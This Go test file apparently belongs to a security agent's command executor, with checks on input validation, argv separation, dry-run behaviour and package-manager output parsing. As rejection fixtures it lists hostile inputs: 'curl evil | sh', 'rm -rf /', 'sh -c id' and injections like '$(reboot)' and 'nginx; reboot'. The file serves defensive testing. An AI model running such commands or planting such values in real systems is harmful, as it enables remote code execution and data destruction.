package executor

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/atillakurtulussimsek/Sentrix/internal/protocol"
)

type call struct {
	name string
	args []string
}

type fakeRunner struct {
	calls []call
	out   map[string]string // key: name + " " + first arg
}

func (f *fakeRunner) run(_ context.Context, name string, args ...string) ([]byte, error) {
	f.calls = append(f.calls, call{name, args})
	key := name
	if len(args) > 0 {
		key += " " + args[0]
	}
	return []byte(f.out[key]), nil
}

func newExec(pm string) (*Executor, *fakeRunner) {
	fr := &fakeRunner{out: map[string]string{}}
	return &Executor{Run: fr.run, AllowPatching: true, PackageManager: pm}, fr
}

// TestNoArbitraryExecution is the core security property: anything outside the closed
// action set, or with unexpected parameters, is rejected before any program runs.
func TestNoArbitraryExecution(t *testing.T) {
	e, fr := newExec("dpkg")
	hostile := []protocol.Command{
		{ID: "c1", Action: "shell", Params: json.RawMessage(`{"cmd":"curl evil | sh"}`)},
		{ID: "c2", Action: "exec", Params: json.RawMessage(`["/bin/sh","-c","id"]`)},
		{ID: "c3", Action: "run", Params: json.RawMessage(`"rm -rf /"`)},
		{ID: "c4", Action: protocol.ActionPatchPackages, Params: json.RawMessage(`{"packages":["$(reboot)"]}`)},
		{ID: "c5", Action: protocol.ActionPatchPackages, Params: json.RawMessage(`{"packages":["-o APT::Get::Fix-Broken=1"]}`)},
		{ID: "c6", Action: protocol.ActionPatchPackages, Params: json.RawMessage(`{"packages":["openssl"],"cmd":"id"}`)},
		{ID: "c7", Action: protocol.ActionRestartService, Params: json.RawMessage(`{"name":"nginx; reboot"}`)},
		{ID: "c8", Action: protocol.ActionRestartService, Params: json.RawMessage(`{"name":"--host=evil"}`)},
		{ID: "c9", Action: protocol.ActionScan, Params: json.RawMessage(`{"command":"id"}`)},
		{ID: "../../etc", Action: protocol.ActionScan},
	}
	for _, c := range hostile {
		res := e.Execute(context.Background(), c)
		if res.Status != protocol.StatusRejected {
			t.Errorf("%s/%s: status %s, want rejected", c.ID, c.Action, res.Status)
		}
	}
	if len(fr.calls) != 0 {
		t.Fatalf("programs were executed for rejected commands: %+v", fr.calls)
	}
}

func TestOnlyAllowedProgramsAndArgvSeparation(t *testing.T) {
	e, fr := newExec("dpkg")
	e.ScheduleReboot = func(time.Duration) {}
	cmds := []protocol.Command{
		{ID: "a", Action: protocol.ActionPatchPackages, Params: json.RawMessage(`{"packages":["openssl","libssl3"]}`)},
		{ID: "b", Action: protocol.ActionPatchAll},
		{ID: "c", Action: protocol.ActionRestartService, Params: json.RawMessage(`{"name":"nginx.service"}`)},
		{ID: "d", Action: protocol.ActionReboot},
	}
	for _, c := range cmds {
		if r := e.Execute(context.Background(), c); r.Status != protocol.StatusOK {
			t.Fatalf("%s: %+v", c.Action, r)
		}
	}
	for _, c := range fr.calls {
		if !AllowedPrograms[c.name] {
			t.Errorf("disallowed program %s", c.name)
		}
		for _, a := range c.args {
			if strings.ContainsAny(a, ";|&`$<>\n") {
				t.Errorf("shell metacharacter in argv: %q", a)
			}
		}
	}
	// restart passes the unit as its own argv element after "--"
	var restart call
	for _, c := range fr.calls {
		if c.name == "systemctl" {
			restart = c
		}
	}
	if strings.Join(restart.args, " ") != "restart -- nginx.service" {
		t.Fatalf("restart argv: %v", restart.args)
	}
	if _, err := e.run(context.Background(), "bash", "-c", "id"); err == nil {
		t.Fatal("run allowed bash")
	}
}

func TestPatchingDisabled(t *testing.T) {
	e, fr := newExec("dpkg")
	e.AllowPatching = false
	r := e.Execute(context.Background(), protocol.Command{ID: "x", Action: protocol.ActionPatchAll})
	if r.Status != protocol.StatusRejected || len(fr.calls) != 0 {
		t.Fatalf("%+v %v", r, fr.calls)
	}
	// dry runs are still allowed
	fr.out["apt-get -s"] = "Inst bash [5.2.15-2+b2] (5.2.15-2+b7 Debian:12/stable [amd64])\n"
	r = e.Execute(context.Background(), protocol.Command{ID: "y", Action: protocol.ActionPatchAll, DryRun: true})
	if r.Status != protocol.StatusOK || len(r.Changes) != 1 || r.Changes[0].To != "5.2.15-2+b7" {
		t.Fatalf("dry run: %+v", r)
	}
	for _, c := range fr.calls {
		if c.name == "apt-get" && len(c.args) > 0 && c.args[0] == "upgrade" {
			t.Fatal("real upgrade ran during dry run")
		}
	}
}

func TestDryRunAptPackages(t *testing.T) {
	e, fr := newExec("dpkg")
	fr.out["apt-get -s"] = "Inst libssl3 [3.0.11-1~deb12u2] (3.0.15-1~deb12u1 Debian-Security:12/stable-security [amd64])\n"
	r := e.Execute(context.Background(), protocol.Command{ID: "z", Action: protocol.ActionPatchPackages, DryRun: true, Params: json.RawMessage(`{"packages":["libssl3"]}`)})
	if r.Status != protocol.StatusOK || len(r.Changes) != 1 || r.Changes[0].From != "3.0.11-1~deb12u2" {
		t.Fatalf("%+v", r)
	}
	last := fr.calls[len(fr.calls)-1]
	if last.args[0] != "-s" {
		t.Fatalf("dry run executed for real: %v", last)
	}
}

func TestParsers(t *testing.T) {
	dnf := `Dependencies resolved.
================================================================================
 Package            Arch      Version                  Repository        Size
================================================================================
Upgrading:
 openssl-libs       x86_64    1:3.0.7-27.el9           baseos           2.1 M
 curl               x86_64    7.76.1-29.el9_4.1        baseos           294 k
Installing dependencies:
 libfoo             noarch    1.0-1.el9                appstream         10 k

Transaction Summary
================================================================================
Upgrade  2 Packages
Operation aborted.`
	ch := ParseDnfTransaction(dnf)
	if len(ch) != 3 || ch[0].Name != "openssl-libs" || ch[0].To != "1:3.0.7-27.el9" {
		t.Fatalf("%+v", ch)
	}
	apk := "(1/2) Upgrading busybox (1.36.1-r15 -> 1.36.1-r20)\n(2/2) Installing newdep (1.0-r0)\nOK: 10 MiB in 20 packages"
	ac := ParseAPKUpgrade(apk)
	if len(ac) != 2 || ac[0].From != "1.36.1-r15" || ac[1].To != "1.0-r0" {
		t.Fatalf("%+v", ac)
	}
}
